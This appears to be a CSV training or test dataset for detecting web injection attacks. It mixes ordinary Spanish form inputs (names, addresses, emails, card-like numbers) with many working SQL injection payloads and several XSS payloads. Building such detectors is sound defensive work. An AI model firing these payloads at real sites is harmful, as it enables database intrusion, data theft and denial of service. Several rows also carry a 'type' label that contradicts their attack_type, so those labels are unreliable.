Text,attack_type,Label,type
"c/ cervera 164, 1e",norm,0,normal
1' where 8635=8635 order by 1--,sqli,1,sql
-1<style><!--</style><script>document.cookie=true;//--></script>,xss,2,xss
p+lyade,norm,0,normal
"1' and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and 'blie'='blie",sqli,1,sql
"1) as ooex where 1087=1087 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1,sql
"""x"" onerror=""alert(1)""></picture>",xss,2,xss
"-9295))) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((8752=8752",sqli,1,sql
pajo,norm,0,normal
06760,norm,0,normal
1) where 1203=1203 rlike (select * from (select(sleep(5)))vwyq)#,sqli,1,sql
"1' and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and 'jjxn'='jjxn",sqli,1,normal
1') and (2763=4004)*4004 and ('dtts'='dtts,sqli,1,normal
"1';call regexp_substring(repeat(right(char(3702),0),500000000),null) and 'hmqd'='hmqd",sqli,1,sql
amoscamiento,norm,0,normal
translaticio,norm,0,normal
grifeo@lalectura.af,norm,0,normal
cuenca,norm,0,normal
wiebe,norm,0,normal
48315,norm,0,normal
lorca,norm,0,normal
c2nve3e213a,norm,0,normal
48707568p,norm,0,normal
16667079z,norm,0,normal
"1"");(select * from (select(sleep(5)))acdk)#",sqli,1,sql
"vdola, la",norm,0,normal
bui,norm,0,normal
nowack@softwaresaas.bm,norm,0,normal
eugenio,norm,0,normal
"calle enrique lopez garcia s/n,",norm,0,normal
84304826m,norm,0,normal
arce/artzi,norm,0,normal
symon,norm,0,normal
24220,norm,0,normal
97428124d,norm,0,normal
sendrs tudanca,norm,0,normal
12480,norm,0,normal
"1"" or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ""dtwv"" like ""dtwv",sqli,1,normal
gallegos de argan,norm,0,normal
"1')) as vrwr where 3830=3830;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1,sql
1') where 1183=1183;select sleep(5)--,sqli,1,sql
sal37a,norm,0,normal
terroba,norm,0,normal
bellprat,norm,0,normal
"<embed src=""http://vulnerability-lab.com/crosssitescripting.swf"" allowscriptaccess=""always""></embed>",xss,2,normal
"-8256""))) or 6872=6872 and (((""lrtu""=""lrtu",sqli,1,normal
te?clear,norm,0,normal
barrachina,norm,0,normal
"1"") or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and (""cdnc"" like ""cdnc",sqli,1,sql
vreugden,norm,0,normal
remus,norm,0,normal
gonsalve,norm,0,normal
1)) rlike (select * from (select(sleep(5)))sgvo) and ((1476=1476,sqli,1,sql
blan2ueo,norm,0,normal
demos3rativa,norm,0,normal
">""<link rel=""stylesheet"" href=""javascript:document.cookie=true;"">",xss,2,xss
1' and sleep(5)#,sqli,1,normal
"1""));select (case when (3565=4053) then 3565 else cast(1 as int)/(select 0 from dual) end) from dual--",sqli,1,sql
refrigerativo,norm,0,normal
c/ darrillo de la magdalena s/n,norm,0,normal
-1&<script>document.cookie=true;</script>,xss,2,xss
"1') where 8125=8125 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",sqli,1,sql
77452423s,norm,0,normal
"1%"";iif(5257=5257,1,1/0)",sqli,1,sql
5734,norm,0,normal
"1))) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
"1""));(select * from (select(sleep(5)))srmq) and ((""xeki"" like ""xeki",sqli,1,sql
cousinea,norm,0,normal
elorrio,norm,0,normal
1' where 8537=8537 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,sqli,1,sql
"plza. alemania, 134, 12?f",norm,0,normal
"1') as eymt where 3911=3911 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
"1"")) as uaxn where 5657=5657 rlike (select (case when (3548=7206) then 1 else 0x28 end))--",sqli,1,sql
brazzel1@castigadas.am,norm,0,normal
silena,norm,0,normal
4271773841923976,norm,0,normal
andrade escriba,norm,0,normal
hirn,norm,0,normal
3598,norm,0,normal
c/ enrique orce marmol 46,norm,0,normal
barriga requena,norm,0,normal
fabiano,norm,0,normal
"1 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))-- zvkh",sqli,1,sql
16727733v,norm,0,normal
oxendine,norm,0,normal
2526,norm,0,normal
hurtado9,norm,0,normal
06173,norm,0,normal
1';select (case when (2352=8672) then 2352 else 2352*(select 2352 from information_schema.character_sets) end)#,sqli,1,sql
mongo,norm,0,normal
"-1593' or elt(7044=6125,6125) and 'zkuz'='zkuz",sqli,1,normal
hermida fiordalizzi,norm,0,normal
1' rlike (select (case when (1916=7874) then 1 else 0x28 end)) and 'ughq'='ughq,sqli,1,sql
pascua,norm,0,normal
5427036195556826,norm,0,normal
1' where 3337=3337 and 8403=5760,sqli,1,normal
cossovel-heintel@camiones-hibridos.ec,norm,0,normal
"1"" (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)",sqli,1,sql
zapatear,norm,0,normal
1%' union all select null--,sqli,1,sql
"c/ criado, 21,",norm,0,normal
"-6520%"") order by 1#",sqli,1,normal
turcot,norm,0,normal
14554532v,norm,0,normal
pl9t1r4,norm,0,normal
"plaa de bandes de musica de la comunitat valenciana, 90 2-h",norm,0,normal
46165,norm,0,normal
silvita,norm,0,normal
i_nsania,norm,0,normal
"calle profesor angel lacalle, s/n,",norm,0,normal
"1 or elt(5873=5873,sleep(5))#",sqli,1,normal
"1' or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and 'esjl'='esjl",sqli,1,sql
1' in boolean mode);(select * from (select(sleep(5)))srmq)#,sqli,1,sql
wolfe,norm,0,normal
boisvert,norm,0,normal
doriot,norm,0,normal
bill,norm,0,normal
"1' or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)",sqli,1,sql
"1"")));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((""jwzy""=""jwzy",sqli,1,sql
castaldi.grasselli@expofloralzaragoza2014.pf,norm,0,normal
c7o5ologa,norm,0,normal
"1 where 8114=8114 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
"-7808"")) as jgkk where 9230=9230 or elt(1032=1032,3623)--",sqli,1,sql
villavendimio,norm,0,normal
chuck,norm,0,normal
"calle vascongadas 83,",norm,0,normal
valsequillo de gran canaria,norm,0,normal
-8625 or 3176=2519# fvgl,sqli,1,normal
6660,norm,0,normal
"1%"";create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
franks.merayo@karldeux.ki,norm,0,normal
1051962151250020,norm,0,normal
1) as duqb where 6495=6495;select (case when (5914=2314) then 5914 else 1/(select 0) end)--,sqli,1,sql
beom-sah,norm,0,normal
25471,norm,0,normal
"-9873"" union all select 8020,8020,8020,8020,8020,8020#",sqli,1,sql
hewson@elrincondelmarmol.ar,norm,0,normal
19332,norm,0,normal
"1""))) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((""fogb"" like ""fogb",sqli,1,sql
zaleska_legon@zampy.so,norm,0,normal
begur,norm,0,normal
5130,norm,0,normal
9728,norm,0,normal
6e665a,norm,0,normal
"1')) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('wzrj'='wzrj",sqli,1,sql
"1')) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and (('wbsz'='wbsz",sqli,1,sql
09128,norm,0,normal
uytterlinden@lamolahotel.ro,norm,0,normal
"1' in boolean mode);call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1,sql
"-3501'))) or make_set(7122=6158,6158) and ((('mlfl' like 'mlfl",sqli,1,normal
pardos@barcafedaniss.co,norm,0,normal
"1' and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and 'rtbm'='rtbm",sqli,1,sql
1') where 2840=2840;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
mastache comapla,norm,0,normal
"1 union all select null,null,null,null,null,null,null--",sqli,1,sql
"1"" or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))",sqli,1,sql
-9178') or 9779=6351,sqli,1,normal
j6ca,norm,0,normal
coulter,norm,0,normal
"1""));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
"1)) as npdl where 5796=5796 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
1';select sleep(5)#,sqli,1,sql
paracuellos de jarama,norm,0,normal
"-3037) where 9024=9024 union all select 9024,9024--",sqli,1,sql
yan-zhen,norm,0,normal
75916349l,norm,0,normal
3362439041972349,norm,0,normal
ferreras de arriba,norm,0,normal
d0n0a1o8,norm,0,normal
"1',(begin if (8340=8340) then dbms_lock.sleep(5); else dbms_lock.sleep(0); end if; end;)",sqli,1,sql
"1"") as amak where 7938=7938 and elt(1210=1210,sleep(5))--",sqli,1,sql
"1 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)# tsxs",sqli,1,normal
jole,norm,0,normal
margheti,norm,0,normal
montemayor de pililla,norm,0,normal
"1%"")) or 4240=(select 4240 from pg_sleep(5))--",sqli,1,sql
radunsky_oses@guejosgratis.cg,norm,0,normal
!7ons6je6am4n2e,norm,0,normal
kavanaugh@corjet.org,norm,0,normal
en546al,norm,0,normal
"-8600"" or elt(1032=1032,3623) and ""kfsn"" like ""kfsn",sqli,1,normal
poma bolet,norm,0,normal
blau-gehring@cpanelhost.com.um,norm,0,normal
24n1e39,norm,0,normal
-7770' where 6503=6503 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,sqli,1,sql
mauer,norm,0,normal
chaney2@adondeir.ng,norm,0,normal
gom4sta,norm,0,normal
mangariello hernanz,norm,0,normal
"paraje contador 158, 12d",norm,0,normal
"1' in boolean mode) and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1,sql
"1,(select (case when (7711=7711) then 1 else 7711*(select 7711 from information_schema.character_sets) end))",sqli,1,sql
5338277186971873,norm,0,normal
cooksey,norm,0,normal
m_at1i852se,norm,0,normal
9834147083222005,norm,0,normal
francoeu,norm,0,normal
pari073l,norm,0,normal
donaldo,norm,0,normal
1))) and 2006=2006,sqli,1,normal
"1'+(select hvsb where 3666=3666;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
"burguerins, 82,",norm,0,normal
"-1<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=document.cookie=true;>",xss,2,sql
barjuan,norm,0,normal
kato,norm,0,normal
veguos@schnapps.com.mn,norm,0,normal
schuett,norm,0,normal
"-5125 union all select 5720,5720,5720,5720,5720,5720,5720,5720--",sqli,1,sql
1 where 6304=6304;begin dbms_lock.sleep(5); end--,sqli,1,sql
xx:xx onerror=alert(1)//--!>,xss,2,xss
"estrecho de ormuz 62, 7-g",norm,0,normal
"-2612"") as iwfj where 3231=3231 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--",sqli,1,sql
delia,norm,0,normal
gowan,norm,0,normal
1e9.l62r2do6,norm,0,normal
"-9934"") or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""xecb"" like ""xecb",sqli,1,sql
"1' in boolean mode);iif(5257=5257,1,1/0)",sqli,1,sql
8480127021010451,norm,0,normal
03500,norm,0,normal
dewey-wellhammer@salacomplices.nz,norm,0,normal
paone,norm,0,normal
aguacella,norm,0,normal
ortega sacrista,norm,0,normal
52207398c,norm,0,normal
">""<bgsound src=""javascript:document.cookie=true;"">",xss,2,xss
35231,norm,0,normal
1');select (case when (3859=6938) then 3859 else 3859*(select 3859 from mysql.db) end)#,sqli,1,sql
"1""))) union all select null,null,null#",sqli,1,sql
59323170y,norm,0,normal
"1'||(select 'ftey' where 1363=1363 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))))||'",sqli,1,sql
"1 where 7240=7240 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
1') where 3588=3588;begin user_lock.sleep(5); end--,sqli,1,sql
"1) where 9371=9371 union all select null,null,null,null,null,null,null--",sqli,1,sql
matosa,norm,0,normal
"1)) as xsyk where 2575=2575 or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
himsel_ewande@spainbareback.ad,norm,0,normal
"1"";select case when 7717=7717 then 1 else null end--",sqli,1,sql
thomas.aranda@muchochinoenchina.iq,norm,0,normal
1')));select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,sqli,1,sql
1') order by 1#,sqli,1,normal
"1"" where 3247=3247 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
sprandel,norm,0,normal
4051,norm,0,normal
"-1526')) or elt(1032=1032,3623) and (('xpob'='xpob",sqli,1,normal
"1"")) as mlid where 1047=1047 union all select null,null#",sqli,1,sql
"1%"" union all select null,null,null,null,null,null,null,null,null#",sqli,1,sql
"1'||(select 'jfxs' from dual where 5485=5485 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1,sql
carnalmente,norm,0,normal
"c/ adega, 103, 5?g",norm,0,normal
9ei91n,norm,0,normal
"-5439"" or 2559=4692 and ""dcrf"" like ""dcrf",sqli,1,normal
norean,norm,0,normal
"-1337"") union all select 7508--",sqli,1,sql
"-1<xml id=""x""><a><b><script>document.cookie=true;</script>;</b></a></xml>",xss,2,xss
"1' in boolean mode) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
"1"" where 5250=5250;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1,sql
citti@manjarr.zw,norm,0,normal
paul,norm,0,normal
doron@beljos.ch,norm,0,normal
"-4005' where 3963=3963 or elt(1032=1032,3623)--",sqli,1,sql
"1"";begin user_lock.sleep(5); end and ""mdje"" like ""mdje",sqli,1,sql
politi arandojo,norm,0,normal
-8812 or 6872=6872# dflr,sqli,1,normal
"1',(select (case when (5433=5433) then 1 else cast(1 as int)/(select 0 from dual) end) from dual)",sqli,1,sql
1)) and 3249=2985,sqli,1,normal
26562587w,norm,0,normal
74s0n2a3,norm,0,normal
1')) as xqam where 6750=6750;select (case when (4205=9574) then 4205 else 1/(select 0) end)--,sqli,1,sql
vilaubi hosta,norm,0,normal
flis@14horas.gt,norm,0,normal
"-1647')) union all select 3030,3030,3030,3030,3030,3030,3030--",sqli,1,sql
66339533n,norm,0,normal
"calle do castron douro, 29 3?c",norm,0,normal
$amarulencia,norm,0,normal
valdepeas de jan,norm,0,normal
"1%'))) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((('%'='",sqli,1,sql
castello7,norm,0,normal
copley@pisossantcugat.bf,norm,0,normal
pierpoint@youtubed.sh,norm,0,normal
gotern,norm,0,normal
38860881n,norm,0,normal
gude1@messadivoce.ai,norm,0,normal
44194,norm,0,normal
"-4400 union all select 3983,3983,3983,3983,3983,3983,3983,3983,3983,3983--",sqli,1,sql
"1'));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (('rkoe'='rkoe",sqli,1,sql
"1' in boolean mode);select count(*) from generate_series(1,5000000)#",sqli,1,sql
comisorio,norm,0,normal
5897112253257561,norm,0,normal
05164,norm,0,normal
85nefici0r3o,norm,0,normal
nao,norm,0,normal
"-4550"") as hlwe where 6026=6026 or (9364=9593)*9593--",sqli,1,sql
"1"")) as turj where 1237=1237;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
48714518n,norm,0,normal
velilla de cinca,norm,0,normal
"1')) as fjbe where 4662=4662 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
"1' where 4334=4334 or elt(5873=5873,sleep(5))#",sqli,1,normal
"1)) union all select null,null,null#",sqli,1,sql
sa6r2,norm,0,normal
"1)) and make_set(8403=8403,8899) and ((4686=4686",sqli,1,normal
"1');select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ('crkz'='crkz",sqli,1,sql
"1"")) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((""xqlh""=""xqlh",sqli,1,sql
00041731d,norm,0,normal
walkins,norm,0,normal
shazmnn,norm,0,normal
7198,norm,0,normal
vilabella,norm,0,normal
waring,norm,0,normal
ofrecedor,norm,0,normal
"-8661"" union all select 5731,5731--",sqli,1,sql
tomacic,norm,0,normal
01308,norm,0,normal
"-5014%""))) or 3348=2430--",sqli,1,sql
"c/ paseillo 153,",norm,0,normal
jose cadalso s/n 7d,norm,0,normal
cormac1,norm,0,normal
""" onclick=alert(xss) "">",xss,2,normal
"-6496"") as obnf where 2903=2903 or make_set(9354=9354,7185)--",sqli,1,sql
1'||(select 'homm' where 4937=4937 rlike (select * from (select(sleep(5)))vwyq)#,sqli,1,sql
clendenning@frioelectric.web,norm,0,normal
"pl. zorrilla 110,",norm,0,normal
addons,norm,0,normal
6923194268200023,norm,0,normal
aileen,norm,0,normal
viera@elrincondelmarmol.by,norm,0,normal
-1641' union all select 4835#,sqli,1,sql
benidoleig,norm,0,normal
10163,norm,0,normal
valdelagua del cerro,norm,0,normal
5844,norm,0,normal
"-2745' or elt(1032=1032,3623)",sqli,1,normal
melque de cercos,norm,0,normal
11693,norm,0,normal
"1%""))) rlike sleep(5)#",sqli,1,normal
santibez el bajo,norm,0,normal
"1"")) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((""kpwc"" like ""kpwc",sqli,1,sql
"1') as jwch where 4609=4609;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,sql
1')) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and (('rgyc'='rgyc,sqli,1,sql
1') where 4003=4003;select sleep(5)#,sqli,1,sql
"1"")) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ((""nbfe""=""nbfe",sqli,1,normal
98411247c,norm,0,normal
"1'||(select 'nvrq' from dual where 4337=4337 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
yueh.frasco@granbretana.com.hk,norm,0,normal
1'+(select yjtm where 3965=3965 and 9389=3443,sqli,1,sql
shandeig,norm,0,normal
04276,norm,0,normal
fuentes calientes,norm,0,normal
"1""))) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (((""staz"" like ""staz",sqli,1,normal
murillo el cuende,norm,0,normal
"marcelino suarez 39,",norm,0,normal
pelland,norm,0,normal
7746,norm,0,normal
"<a href=""http://1113982867/"">crosssitescripting</a>",xss,2,normal
zaloker,norm,0,normal
"1)) as dhge where 4816=4816 and 2388=benchmark(5000000,md5(0x6d457153))#",sqli,1,normal
"-5652%') union all select 4447,4447,4447,4447,4447,4447,4447,4447,4447--",sqli,1,sql
"1""))) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (((""wute"" like ""wute",sqli,1,normal
"1' in boolean mode) union all select null,null,null#",sqli,1,sql
sobermeja,norm,0,normal
jara escobedo,norm,0,normal
tablian2@tequieroverde.az,norm,0,normal
"content:url(data:image/svg+xml,<svg/>);visibility:hidden onload=alert(1)></div>",xss,2,xss
poulsen,norm,0,normal
"elt(8192=8192,sleep(5))",sqli,1,normal
"-2434'))) union all select 5509,5509,5509,5509,5509,5509,5509--",sqli,1,sql
gamero piquer,norm,0,normal
1';select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,sqli,1,sql
"1%"" union all select null,null,null--",sqli,1,sql
bruna,norm,0,normal
"1')) as nhkp where 8030=8030;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
birley@euskalcasino.pro,norm,0,normal
eggebraa,norm,0,normal
16535,norm,0,normal
43774,norm,0,normal
"-8824%')) or make_set(9354=9354,7185) and (('%'='",sqli,1,normal
"1%""))) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((""%""=""",sqli,1,sql
"-3104"" union all select 5717,5717,5717,5717,5717,5717,5717,5717,5717--",sqli,1,sql
anja,norm,0,normal
3119845322220598,norm,0,normal
vilafams,norm,0,normal
8457,norm,0,normal
63829565b,norm,0,normal
6554,norm,0,normal
corvera de asturias,norm,0,normal
malh5jo,norm,0,normal
"1')) as anaq where 9605=9605 and elt(4249=4249,7259)--",sqli,1,sql
